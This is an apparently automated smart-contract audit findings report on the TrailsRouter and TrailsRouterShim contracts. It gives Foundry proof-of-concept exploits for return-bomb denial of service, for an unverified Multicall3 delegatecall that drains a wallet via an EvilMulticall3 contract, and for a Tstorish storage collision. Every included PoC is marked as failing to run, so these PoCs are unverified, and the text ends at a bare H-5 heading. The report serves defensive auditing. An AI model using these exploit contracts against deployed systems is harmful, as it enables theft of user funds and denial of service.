# 2025 11 sequence - Findings Report
## Commit hash: 593987c2b569f3212d2cadb31fc8d14b84bc30a9

##Findings by Pattern

USING MULTI_PATTERN_TO_FINDING_ANALYSIS_MODE = false; and gpt-5
4 VALID UNIQUES

NICHE_PATTERN_ANALYSIS_MODE = false;

 **Derived From** : Unbounded return-data copy enables return-bomb DoS via router call

[M-1]. Unbounded revert/return-data bubbling in TrailsRouterShim enables return-bomb OOG DoS on intent execution
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: Exploitability depends on whether TrailsRouter can be induced to surface large returndata (e.g., by aggregating a call that returns huge bytes). If the router never returns dynamic/large data or already caps/ignores returndata, the issue’s practical impact diminishes. Without full router return semantics here, there is some uncertainty, but the unbounded copy in the shim is real.
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : pullAmountAndExecute delegatecalls unverified Multicall3 (supply-chain risk)

[M-2]. TrailsRouter.pullAmountAndExecute delegatecalls unverified Multicall3 at 0xca11..., enabling arbitrary code execution and token drain
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The exploit requires the specific chain’s 0xCA11… address to be malicious or mismatched, which is an external environmental condition. While the root cause is sound (unverified delegatecall), practical exploitability varies by chain; hence marked somewhat confident.
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Unbounded return-data event logging enables return-bomb DoS

[L-3]. Unbounded bytes in BalanceInjectorCall lets malicious targets return-bomb and DoS inject* flows
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : Delegatecall storage collision on Tstorish flag may misroute to tload and DoS sentinel reads

[M-4]. Storage collision on Tstorish._tstoreSupport flips to tload and bricks validateOpHashAndSweep sweeping
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The issue definitively exists in code under delegatecall contexts with the fallback path. Its real-world trigger depends on network support for EIP-1153 (TSTORE/TLOAD) and deployment timing. If all target chains support TSTORE at deploy time, the immutable function pointer will use tload/tstore and avoid the fallback branch. Lacking definitive chain deployment targets, we mark as valid but only somewhat confident about exploitability across all deployments.
Finding Complexity: 7
Privilege: RequiresRole



 **Derived From** : Public injectAndCall/execute let anyone drain router’s own ETH/ERC20 balances

[H-5]. Auth bypass: public injectAndCall lets anyone forward all router ETH or approve-drain all router ERC20s
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Delegatecall storage collision makes Tstorish pick wrong branch and can brick shim

[M-6]. Delegatecall storage collision on _tstoreSupport in TrailsRouterShim.handleSequenceDelegateCall can trigger invalid tstore and DoS on non‑1153 chains
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The impact depends on two environment conditions: (1) chain lacks EIP-1153 and (2) the Sequence v3 wallet’s storage slot 0 is non-zero at runtime. While both are plausible, we cannot conclusively confirm slot 0 contents for all Sequence deployments from the provided repo. The root cause and revert path are sound, but environment specifics temper absolute confidence.
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : execute can spend router ETH balance; public callers can drain leftover value

[L-7]. TrailsRouter.execute allows permissionless draining of router-held ETH via delegatecall to Multicall3.aggregate3Value
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: While the technical exploit path is clear, there is some ambiguity whether the behavior is considered acceptable given the router’s stateless, delegatecall-centric design and that holding ETH on the router is unintended. This could be argued as user error or expected behavior for a standalone helper, hence SomeWhatConfident.
Finding Complexity: 4
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 1
- M: 4
- L: 2
- I: 0

##Findings by Pattern


 **Derived From** : Unbounded return-data copy enables return-bomb DoS via router call

## [M-1]. Unbounded revert/return-data bubbling in TrailsRouterShim enables return-bomb OOG DoS on intent execution

### Finding Severity Justification: The shim uses a low-level call that copies the entire returndata into memory and then re-encodes/returns it unbounded. A malicious downstream callee (reachable via the router’s composed calls) can return or revert with extremely large payloads, causing out-of-gas during returndata copying/encoding and reverting the entire intent execution. This impacts protocol availability (intent execution/fee sweep flow) but does not directly risk user assets, fitting a Medium severity under Code4rena’s rubric.
## Derived From Pattern/Invariant
Unbounded return-data copy enables return-bomb DoS via router call

## Exploit Type
Dos

## Location
TrailsRouterShim._forwardToRouter

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: Exploitability depends on whether TrailsRouter can be induced to surface large returndata (e.g., by aggregating a call that returns huge bytes). If the router never returns dynamic/large data or already caps/ignores returndata, the issue’s practical impact diminishes. Without full router return semantics here, there is some uncertainty, but the unbounded copy in the shim is real.
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouterShim forwards arbitrary calls to ROUTER and then either reverts embedding the entire revert bytes or returns the full returned bytes. Both paths copy unbounded return data, so a malicious downstream callee (invoked by ROUTER) can return or revert with extremely large payloads that are bubbled up by ROUTER. The shim then copies them again: on failure via revert RouterCallFailed(ret), and on success via assembly return(add(routerReturn, 32), mload(routerReturn)). This can consume excessive gas and cause out-of-gas, preventing the success sentinel from being set and bricking the execution.

Vulnerable snippets:

1) Failure path copies unbounded ret into error data:
if (!success) {
    revert RouterCallFailed(ret);
}

2) Success path returns unbounded routerReturn verbatim:
assembly {
    return(add(routerReturn, 32), mload(routerReturn))
}

## Impact
Because TrailsRouterShim copies unbounded returndata on both failure and success paths, any downstream callee reachable via ROUTER can force the shim to run out of gas by returning or reverting with extremely large payloads. Critically, even when the underlying router execution would otherwise succeed, a large success returndata can still make the shim revert during copy/return, rolling back the success sentinel write. This converts a successful route into a permanent per-intent DoS (until the route changes), wasting relayer gas and blocking fee sweep without direct asset loss.

## Command to Run Test


## Proof of Concept
Actors and preconditions:
- Attacker deploys ReturnBomb that either returns or reverts with arbitrarily large bytes.
- A mock router (MockRouterBubble) calls the target and bubbles returndata/revertdata unchanged.
- Shim forwards to ROUTER using low-level call and then re-encodes/returns the data unbounded.

Attack (success-path "return-bomb"):
1) Relayer (or malicious downstream callee within the route) causes ROUTER to call ReturnBomb.ok(size) with a very large size (e.g., megabytes).
2) ROUTER obtains the large returndata from ReturnBomb and bubbles it back to shim unchanged.
3) Shim receives the huge returndata and then:
   - Either OOG occurs while the low-level call result is being copied into memory (before the sentinel write), or
   - It writes the success sentinel and then OOGs on the final assembly return(add(routerReturn,32), mload(routerReturn)). Either way, the frame reverts and the sentinel write is rolled back.
4) The intent execution reverts despite the downstream call having succeeded, creating a DoS on this intent.

Attack (failure-path "revert-bomb"):
1) ROUTER calls ReturnBomb.bomb(size) which reverts with a huge payload.
2) The revertdata is copied into shim memory unbounded; shim then reverts with RouterCallFailed(ret), re-encoding the entire payload and likely running OOG.
3) The call fails well before the sentinel can be set; relayers waste gas and the flow cannot complete.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouterShim} from "src/TrailsRouterShim.sol";
import {ITrailsRouterShim} from "src/interfaces/ITrailsRouterShim.sol";

contract ReturnBomb {
    // Returns large bytes
    function ok(uint256 size) external pure returns (bytes memory) {
        bytes memory big = new bytes(size);
        assembly {
            return(add(big, 32), mload(big))
        }
    }
    // Reverts with large bytes
    function bomb(uint256 size) external pure {
        bytes memory big = new bytes(size);
        assembly {
            revert(add(big, 32), mload(big))
        }
    }
}

// Router that bubbles return/revert data from target unchanged
contract MockRouterBubble {
    function callTarget(address target, bool revertMode, uint256 size) external payable returns (bytes memory) {
        bytes memory cd;
        if (revertMode) cd = abi.encodeWithSignature("bomb(uint256)", size);
        else cd = abi.encodeWithSignature("ok(uint256)", size);
        (bool s, bytes memory ret) = target.call(cd);
        if (!s) {
            assembly { revert(add(ret, 32), mload(ret)) }
        }
        return ret;
    }
}

// Simulates a Sequence wallet executing the shim via delegatecall
contract WalletSim {
    // Low-level delegatecall returning only success flag to avoid copying huge returndata
    function execDelegate(address target, bytes memory data, uint256 gasLimit) external returns (bool ok) {
        assembly {
            ok := delegatecall(gasLimit, target, add(data, 0x20), mload(data), 0, 0)
        }
    }
}

contract ReturnBombDOS_Test is Test {
    WalletSim wallet;
    TrailsRouterShim shim;
    MockRouterBubble router;
    ReturnBomb bomb;

    function setUp() public {
        wallet = new WalletSim();
        router = new MockRouterBubble();
        shim = new TrailsRouterShim(address(router));
        bomb = new ReturnBomb();
    }

    // Success-path return-bomb: large success returndata causes OOG/failed delegatecall
    function test_ReturnBomb_SuccessPath_OOG() public {
        bytes32 opHash = keccak256("op-hash-success");
        uint256 huge = 4 * 1024 * 1024; // 4 MB

        // router.callTarget(bomb, revertMode=false, huge)
        bytes memory forwardData = abi.encodeWithSelector(MockRouterBubble.callTarget.selector, address(bomb), false, huge);
        bytes memory innerAndValue = abi.encode(forwardData, uint256(0));
        bytes memory shimCall = abi.encodeWithSelector(
            ITrailsRouterShim.handleSequenceDelegateCall.selector,
            opHash,
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            innerAndValue
        );

        bool ok = wallet.execDelegate(address(shim), shimCall, 10_000_000);
        assertEq(ok, false, "delegatecall should fail due to return-bomb OOG");
    }

    // Revert-path revert-bomb: huge revertdata causes OOG/failed delegatecall
    function test_RevertBomb_OOG() public {
        bytes32 opHash = keccak256("op-hash-revert");
        uint256 huge = 4 * 1024 * 1024; // 4 MB

        // router.callTarget(bomb, revertMode=true, huge)
        bytes memory forwardData = abi.encodeWithSelector(MockRouterBubble.callTarget.selector, address(bomb), true, huge);
        bytes memory innerAndValue = abi.encode(forwardData, uint256(0));
        bytes memory shimCall = abi.encodeWithSelector(
            ITrailsRouterShim.handleSequenceDelegateCall.selector,
            opHash,
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            innerAndValue
        );

        bool ok = wallet.execDelegate(address(shim), shimCall, 10_000_000);
        assertEq(ok, false, "delegatecall should fail due to revert-bomb OOG");
    }
}


## Suggested Mitigation
Stop unbounded bubbling of returndata/revertdata and avoid implicit full-copy that Solidity inserts for (bool, bytes) call returns.

Recommended changes:
- Use inline assembly for the low-level call to ROUTER and cap the amount of returndata copied via returndatacopy. For example:
  - After call, read returndatasize into rds.
  - Let cap be a small constant (e.g., 4096 bytes). Copy only min(rds, cap) into a fresh buffer.
  - If success == 0, revert with a fixed-size/truncated error, e.g., RouterCallFailedTruncated(bytes32 hash, uint32 originalLen), where hash = keccak256 of the full returndata (computed via incremental hashing if needed) or simply omit the body entirely.
  - If success == 1, do NOT return arbitrarily large bytes. Either return nothing (preferred, since handleSequenceDelegateCall has no declared return), or return only up to cap bytes.
- Avoid encoding "bytes" into a custom error on failure; it forces another full copy/encode. Use a metadata-only error (length + hash) or a short prefix of the data.
- If full returndata is strictly required for some off-chain reason, emit an event with a hard cap or store a hash, and let off-chain infra fetch details from simulation rather than chain.
- Consider guarding against pathological returndatasize at the ROUTER level too (e.g., require downstream adapters to cap returndata) to reduce repeated copying along the chain of calls.

These changes ensure neither success nor failure paths perform unbounded memory expansion/copy, eliminating the return-bomb OOG vector.





 **Derived From** : pullAmountAndExecute delegatecalls unverified Multicall3 (supply-chain risk)

## [M-2]. TrailsRouter.pullAmountAndExecute delegatecalls unverified Multicall3 at 0xca11..., enabling arbitrary code execution and token drain

### Finding Severity Justification: Delegatecalling an external contract at a hardcoded address without verifying its bytecode allows arbitrary code execution in the router’s context. If the address 0xCA11... hosts malicious or unexpected code on a given chain, tokens pulled into the router (or ETH) can be drained. Impact is loss of user funds; however, exploitation depends on external conditions (the deployed code at that canonical address per chain), reducing likelihood. High impact but low likelihood maps to Medium per rubric.
## Derived From Pattern/Invariant
pullAmountAndExecute delegatecalls unverified Multicall3 (supply-chain risk)

## Exploit Type
UntrustedDelegateCall

## Location
TrailsRouter.pullAmountAndExecute

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The exploit requires the specific chain’s 0xCA11… address to be malicious or mismatched, which is an external environmental condition. While the root cause is sound (unverified delegatecall), practical exploitability varies by chain; hence marked somewhat confident.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter validates only the calldata selector (aggregate3Value) and that allowFailure=false, then delegatecalls to a hardcoded address MULTICALL3 = 0xcA11... without verifying its codehash or implementation. If that address hosts a malicious implementation on a chain, arbitrary logic executes in the TrailsRouter context, post token pull. Because pullAmountAndExecute first pulls ERC20 from msg.sender, the malicious Multicall3 can transfer those freshly pulled tokens (or ETH when applicable) to an attacker address or corrupt storage. Vulnerable lines: (in execute and pullAmountAndExecute)

(bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
if (!success) revert TargetCallFailed(returnData);

_validateRouterCall only checks selector 0x174dea71 and allowFailure=false; it does not authenticate the callee’s code.

## Impact
Because execute and pullAmountAndExecute delegatecall into an unverified address, arbitrary code runs in the caller’s context. In the intended deployment where TrailsRouter is invoked via delegatecall from a Sequence wallet, this delegatecall chain causes the code at 0xCA11… to execute in the wallet’s context. A malicious/unexpected implementation at that address can transfer any ERC20 or ETH held by the wallet (not just the just-pulled amount), or corrupt wallet storage. When used standalone, it can at minimum drain the ERC20/ETH that the router has just pulled in. This is arbitrary code execution with potential full wallet drain on affected chains.

## Command to Run Test


## Proof of Concept
Revised PoC (wallet-context drain):
1) Attacker ensures that on the target chain, 0xcA11… does not host the canonical Multicall3 and instead hosts attacker-controlled bytecode (or simply differs from the expected codehash).
2) User’s wallet calls TrailsRouter via delegatecall (as designed) to run an aggregate3Value bundle.
3) TrailsRouter validates the selector and allowFailure=false but does not verify code at 0xcA11…. It then delegatecalls into 0xcA11….
4) The malicious code now executes in the wallet’s context and can transfer any ERC20/ETH owned by the wallet to the attacker, ignoring the provided calls array entirely.
5) Result: complete drain of the wallet’s balances for any token the malicious code decides to move.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IMulticall3} from "src/interfaces/IMulticall3.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MOCK") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract EvilMulticall3 {
    struct Call3Value { address target; bool allowFailure; uint256 value; bytes callData; }
    struct Result { bool success; bytes returnData; }

    address public immutable sink;
    constructor(address sink_) { sink = sink_; }

    function aggregate3Value(Call3Value[] calldata calls) external payable returns (Result[] memory results) {
        // Drain entire balance of the token specified as first target (ignores provided calldata semantics)
        if (calls.length > 0) {
            address token = calls[0].target;
            uint256 bal = IERC20(token).balanceOf(address(this)); // this == wallet due to delegatecall chain
            if (bal > 0) {
                IERC20(token).transfer(sink, bal);
            }
        }
        results = new Result[](calls.length);
        for (uint256 i; i < calls.length; i++) {
            results[i] = Result(true, "");
        }
    }
}

contract MockWallet {
    // Delegatecall into TrailsRouter.execute so subsequent delegatecall to MULTICALL3 runs in wallet context
    function run(address router, bytes calldata data) external {
        (bool ok, bytes memory ret) = router.delegatecall(abi.encodeWithSelector(TrailsRouter.execute.selector, data));
        require(ok, string(ret));
    }
}

contract UntrustedDelegatecallWalletExploitTest is Test {
    TrailsRouter router;
    MockERC20 token;
    MockWallet wallet;
    address attacker = address(0xCAFE);

    function setUp() public {
        router = new TrailsRouter();
        token = new MockERC20();
        wallet = new MockWallet();
        token.mint(address(wallet), 1_000e18);
        vm.deal(attacker, 10 ether);
    }

    function test_MaliciousMulticall3_DrainsWalletViaExecute() public {
        // Attacker places malicious code at the hardcoded Multicall3 address
        EvilMulticall3 evil = new EvilMulticall3(attacker);
        address multiAddr = router.MULTICALL3();
        vm.etch(multiAddr, address(evil).code);

        // Build aggregate3Value calldata with allowFailure=false (passes router validation)
        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: address(token),
            allowFailure: false,
            value: 0,
            callData: abi.encodeWithSelector(IERC20.approve.selector, address(0xDEAD), 0)
        });
        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);

        uint256 walletBefore = token.balanceOf(address(wallet));
        uint256 attackerBefore = token.balanceOf(attacker);

        // Wallet delegates to router.execute -> router delegatecalls malicious 0xCA11..., draining wallet
        wallet.run(address(router), data);

        assertEq(token.balanceOf(address(wallet)), 0, "wallet drained");
        assertEq(token.balanceOf(attacker), attackerBefore + walletBefore, "attacker gained full wallet balance");
    }
}


## Suggested Mitigation
Fully remove the external delegatecall dependency on 0xcA11…:
- Inline a minimal, audited aggregate3Value implementation inside TrailsRouter (or a linked internal library) and iterate targets via .call/.call{value: v} directly. When TrailsRouter is delegatecalled from the wallet, msg.sender to downstream targets remains the wallet, preserving current semantics without any external delegatecall.
- If retaining an external Multicall3 is unavoidable, enforce an allowlist check on its bytecode prior to use (e.g., immutable expectedCodeHash set at deployment per chain, or a mapping chainId => codehash). Revert if extcodehash(MULTICALL3) != expected hash.
- Optionally restrict execute/pull* to onlyDelegatecall to reduce blast radius in standalone usage and avoid trapping funds if 0xCA11… has no code on a chain.
These changes eliminate supply-chain risk while preserving functionality.





 **Derived From** : Unbounded return-data event logging enables return-bomb DoS

## [L-3]. Unbounded bytes in BalanceInjectorCall lets malicious targets return-bomb and DoS inject* flows

### Finding Severity Justification: The issue allows a target contract to force out-of-gas by returning or reverting with very large bytes, causing event emission (and custom error encoding) to OOG and revert. This is a per-call denial-of-service with no loss of funds or persistent protocol impact, and it requires interacting with a malicious or misbehaving target. Relayers/users can avoid such targets via simulation, so impact is limited to gas griefing on individual executions.
## Derived From Pattern/Invariant
Unbounded return-data event logging enables return-bomb DoS

## Exploit Type
Dos

## Location
TrailsRouter._injectAndExecuteCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter._injectAndExecuteCall performs an unbounded external call to a user-supplied target and then emits BalanceInjectorCall including the entire returned bytes. A malicious target can return (or revert with) arbitrarily large data. Emitting the event with the full bytes forces massive memory expansion and LOG data costs, causing out-of-gas and reverting the whole transaction even when the low-level call itself succeeded. Vulnerable snippet:

(bool success, bytes memory result) = target.call{value: callerBalance}(callData);
emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
if (!success) revert TargetCallFailed(result);

Same pattern exists for the ERC-20 branch.

## Impact
Any inject* call can be DoS’ed by a malicious target that returns or reverts with very large bytes. Because Solidity copies the entire return/revert data into memory for `(bool, bytes memory)` low-level calls, the router will consume unbounded gas even before logging. Emitting the full `result` in `BalanceInjectorCall` and re-encoding it in `TargetCallFailed(result)` amplifies the issue, making it trivial to force Out-of-Gas and revert. This is a per-call gas griefing/availability issue with no loss of funds, but it can waste relayer gas and block intended flows.

## Command to Run Test


## Proof of Concept
1) Deploy a target contract whose functions return or revert with arbitrarily large bytes. 2) Call TrailsRouter.injectSweepAndCall with token=ETH and target=the malicious contract, passing calldata to trigger the large return or revert. 3) Even if the external call itself succeeds, the router copies the full returndata, then emits an event with the full bytes and (on failure) re-encodes them in a custom error, consuming unbounded gas and reverting. 4) Result: DoS of inject* flows and relayer gas griefing.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";

contract ReturnBomb {
    // Returns arbitrarily large bytes (length n)
    function bigReturn(uint256 n) external payable returns (bytes memory) {
        assembly {
            let p := mload(0x40)
            let size := add(n, 0x20)
            mstore(0x40, add(p, size))
            mstore(p, n)
            return(p, size)
        }
    }

    // Reverts with arbitrarily large revert data (length n)
    function bigRevert(uint256 n) external payable {
        assembly {
            let p := mload(0x40)
            let size := add(n, 0x20)
            mstore(0x40, add(p, size))
            mstore(p, n)
            revert(p, size)
        }
    }
}

contract ReturnBomb_DoS_Test is Test {
    TrailsRouter router;
    ReturnBomb bomb;

    function setUp() public {
        router = new TrailsRouter();
        bomb = new ReturnBomb();
        vm.deal(address(this), 10 ether);
    }

    // Demonstrates DoS on success path: large returndata + event logging OOG under gas cap
    function test_ReturnBomb_SuccessPath_DoS_WithGasCap() public {
        uint256 size = 64_000; // 64 KB
        bytes memory callData = abi.encodeWithSelector(ReturnBomb.bigReturn.selector, size);
        bytes memory payload = abi.encodeWithSelector(
            TrailsRouter.injectSweepAndCall.selector,
            address(0),
            address(bomb),
            callData,
            0,
            bytes32(0)
        );

        // Limit gas so the unbounded copy + event LOG of large bytes reliably fails
        (bool ok,) = address(router).call{value: 1 wei, gas: 200_000}(payload);
        assertFalse(ok, "call should fail due to return-bomb gas griefing (success path)");
    }

    // Demonstrates DoS on failure path: large revert data + event logging OOG under gas cap
    function test_RevertBomb_FailurePath_DoS_WithGasCap() public {
        uint256 size = 64_000; // 64 KB
        bytes memory callData = abi.encodeWithSelector(ReturnBomb.bigRevert.selector, size);
        bytes memory payload = abi.encodeWithSelector(
            TrailsRouter.injectSweepAndCall.selector,
            address(0),
            address(bomb),
            callData,
            0,
            bytes32(0)
        );

        (bool ok,) = address(router).call{value: 1 wei, gas: 200_000}(payload);
        assertFalse(ok, "call should fail due to revert-data return-bomb gas griefing (failure path)");
    }
}


## Suggested Mitigation
- Avoid copying unbounded returndata. Use assembly to cap RETURNDATACOPY to a small MAX (e.g., 4–8 KB). If larger, truncate and optionally store only keccak256 and length.
- Do not emit the full `bytes result` in BalanceInjectorCall. Emit keccak256(result) and result.length (and at most a short prefix) instead.
- Do not propagate full revert data in TargetCallFailed. Either revert with a fixed error or include only a truncated slice/hash and length.
- Optionally limit gas forwarded to the target call to reduce griefing surface, but do not rely on this alone; bounding returndata and emitted data is the primary fix.





 **Derived From** : Delegatecall storage collision on Tstorish flag may misroute to tload and DoS sentinel reads

## [M-4]. Storage collision on Tstorish._tstoreSupport flips to tload and bricks validateOpHashAndSweep sweeping

### Finding Severity Justification: The bug can DoS validateOpHashAndSweep, preventing fee sweeping after successful executions. This impacts protocol liveness and economic functionality (relayer compensation) but does not directly risk user funds. Hence, functional/economic impact without direct asset loss -> Medium.
## Derived From Pattern/Invariant
Delegatecall storage collision on Tstorish flag may misroute to tload and DoS sentinel reads

## Exploit Type
StorageLayout

## Location
TrailsRouter.validateOpHashAndSweep

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The issue definitively exists in code under delegatecall contexts with the fallback path. Its real-world trigger depends on network support for EIP-1153 (TSTORE/TLOAD) and deployment timing. If all target chains support TSTORE at deploy time, the immutable function pointer will use tload/tstore and avoid the fallback branch. Lacking definitive chain deployment targets, we mark as valid but only somewhat confident about exploitability across all deployments.
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
TrailsRouter inherits Tstorish, which keeps a non‑namespaced bool _tstoreSupport in storage slot 0 to decide whether to use tload or sload inside the fallback path. Because TrailsRouter is designed to be used via delegatecall from a Sequence wallet, reading _tstoreSupport under delegatecall fetches the caller wallet’s slot 0, not the router’s. If the wallet’s slot 0 is non‑zero (common), _getTstorishWithSloadFallback will take the tload branch. On chains without TSTORE/TLOAD this triggers invalid opcode; on chains with TSTORE it reads ephemeral storage instead of sstore, returning 0 and reverting SuccessSentinelNotSet even when the success sentinel is correctly sstored. As a result, TrailsRouter.validateOpHashAndSweep can be DoS’d and fee sweeping bricked. Vulnerable snippet from Tstorish:

function _getTstorishWithSloadFallback(uint256 storageSlot) private view returns (uint256 value) {
  if (_tstoreSupport) {
    assembly { value := tload(storageSlot) }
  } else {
    assembly { value := sload(storageSlot) }
  }
}

validateOpHashAndSweep relies on _getTstorish to read the success sentinel (TrailsSentinelLib.successSlot(opHash)); a misrouted tload path under delegatecall corrupts the read and reverts.

## Impact
validateOpHashAndSweep can be permanently DoSed in delegatecall context: (a) on pre-Cancun/non-TSTORE chains, the delegated read of Tstorish._tstoreSupport (slot 0) may evaluate true due to wallet storage, forcing tload in _getTstorishWithSloadFallback and causing an immediate invalid-opcode revert; (b) on TSTORE-enabled chains, validateOpHashAndSweep unconditionally uses tload (via constructor-selected function pointer) and will observe 0 unless the sentinel was written in transient storage in the same transaction, making fee sweeping fail even when the sentinel was correctly persisted with sstore. This blocks relayer fee collection and breaks liveness and economic flows without direct loss of user funds.

## Command to Run Test


## Proof of Concept
Overview of the exploit in delegatecall routing

Context: TrailsRouter inherits Tstorish and is intended to run via delegatecall from a Sequence wallet. Tstorish uses a storage flag _tstoreSupport to switch between sload and tload when the chain did not support TSTORE at deployment. Under delegatecall, reading _tstoreSupport actually reads the caller wallet’s slot 0, which is commonly non-zero.

Two concrete failure modes
1) Non-TSTORE chains (pre-Cancun or chains without EIP-1153):
   - Router deployed when TSTORE is unavailable → Tstorish sets _getTstorish = _getTstorishWithSloadFallback.
   - A delegated call to validateOpHashAndSweep reads _tstoreSupport from the wallet’s slot 0 (non-zero) and takes the tload branch.
   - Because the chain does not support tload, the call reverts with invalid opcode, DoSing sweeping.

2) TSTORE-enabled chains:
   - Router deployed when TSTORE is available → Tstorish sets _getTstorish = _getTstore (always tload).
   - If the success sentinel for opHash was persisted with sstore (e.g., written by another component, test harness, or a different path), validateOpHashAndSweep will read via tload and see 0, reverting with SuccessSentinelNotSet despite a valid sstore’d sentinel. Even if the system writes via tstore, the value is transient and will be 0 in subsequent transactions, again bricking sweeping unless read and write happen in the same transaction.

Attack steps (works generically):
- Attacker/relayer executes TrailsRouter via delegatecall from a wallet whose slot 0 is non-zero (typical). A valid success sentinel is sstore’d at TrailsSentinelLib.successSlot(opHash).
- Call validateOpHashAndSweep(opHash, token, recipient) via delegatecall.
- Non-TSTORE chains: _tstoreSupport is read from wallet slot 0 and treated as true → tload path → invalid opcode revert.
- TSTORE chains: router unconditionally tloads the sentinel slot → returns 0 (transient storage is empty) → reverts with SuccessSentinelNotSet. Sweeping is blocked in both cases.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {TrailsSentinelLib} from "src/libraries/TrailsSentinelLib.sol";

contract WalletMock {
    // slot 0 collision (intentionally non-zero)
    uint256 public slot0Val = 123;
    address public router;

    constructor(address _router) {
        router = _router;
    }

    function callValidate(bytes32 opHash, address token, address recipient) external {
        (bool ok, bytes memory ret) = router.delegatecall(
            abi.encodeWithSelector(TrailsRouter.validateOpHashAndSweep.selector, opHash, token, recipient)
        );
        if (!ok) {
            assembly { revert(add(ret, 32), mload(ret)) }
        }
    }

    receive() external payable {}
}

contract TstorishCollision_DoS_Test is Test {
    TrailsRouter router;
    WalletMock wallet;

    // Helper to probe tload availability (mirrors Tstorish deploy+staticcall logic)
    function _prepareTloadTest() internal returns (address contractAddress) {
        // Bytecode that returns code containing TLOAD opcode; same payload as in Tstorish
        uint256 payload = 0x6002601e613d5c3d52f3; // 0x0a bytes, offset 0x16
        assembly {
            mstore(0, payload)
            contractAddress := create(0, 0x16, 0x0a)
        }
    }

    function _testTload(address tloadTestContract) internal view returns (bool ok) {
        (ok,) = tloadTestContract.staticcall{gas: gasleft()/10}("");
    }

    function setUp() public {
        router = new TrailsRouter();
        wallet = new WalletMock(address(router));
    }

    function test_DoS_validateOpHashAndSweep_dueTo_Tstorish_Delegatecall_Context() public {
        // Arrange: sstore the success sentinel in the wallet storage (persistent)
        bytes32 opHash = keccak256("opHash-demo");
        uint256 slot = TrailsSentinelLib.successSlot(opHash);
        vm.store(address(wallet), bytes32(slot), bytes32(uint256(1))); // SUCCESS_VALUE

        // Sanity: prove sentinel is sstore'd
        assertEq(vm.load(address(wallet), bytes32(slot)), bytes32(uint256(1)));

        // Act + Assert:
        // - On non-TSTORE chains, delegated read flips to tload via slot-0 collision and invalid-opcode reverts.
        // - On TSTORE chains, router tloads the slot (transient storage), observes 0 and reverts SuccessSentinelNotSet.
        // Either way, sweeping is DoS'd: expect revert without binding to a specific reason.
        vm.expectRevert();
        wallet.callValidate(opHash, address(0), address(0xBEEF));

        // Sentinel is still present in persistent storage, showing the revert wasn't due to it being unset.
        assertEq(vm.load(address(wallet), bytes32(slot)), bytes32(uint256(1)));

        // Optional: log environment for debugging
        address t = _prepareTloadTest();
        bool tloadSupported = t != address(0) && _testTload(t);
        emit log_bool(tloadSupported);
    }
}


## Suggested Mitigation
Do not gate tload/sload based on a storage flag in a delegatecall extension, and do not use transient storage for persistent sentinels.

Recommended fixes:
- For success sentinel accessors, remove Tstorish indirection and unconditionally use sload/sstore. The sentinel is a cross-call, potentially cross-transaction invariant and must be persisted. Example: in validateOpHashAndSweep replace `_getTstorish(slot)` with direct sload of `slot` and ensure the writer uses sstore.
- If Tstorish must remain, split APIs: a PersistentStore utility for sstore/sload (for sentinels) and an EphemeralStore utility for tstore/tload where appropriate. Do not mix them.
- Eliminate runtime branching under delegatecall. If you still want to optionally activate TSTORE elsewhere, keep that mechanism in contracts that are called directly (not via delegatecall), or make support a constructor-time immutable that selects one of two code paths without any storage flag.
- If a storage flag is kept for any reason, namespace it using an EIP-7201-style dedicated slot to avoid slot-0 collisions with delegatecall callers, and ensure that flag is never consulted in delegatecall-only execution paths.
- Consider documenting or enforcing (with runtime checks) that reading via tload is only used within the same transaction where the value is written via tstore; otherwise default to sload.





 **Derived From** : Public injectAndCall/execute let anyone drain router’s own ETH/ERC20 balances

## [H-5]. Auth bypass: public injectAndCall lets anyone forward all router ETH or approve-drain all router ERC20s

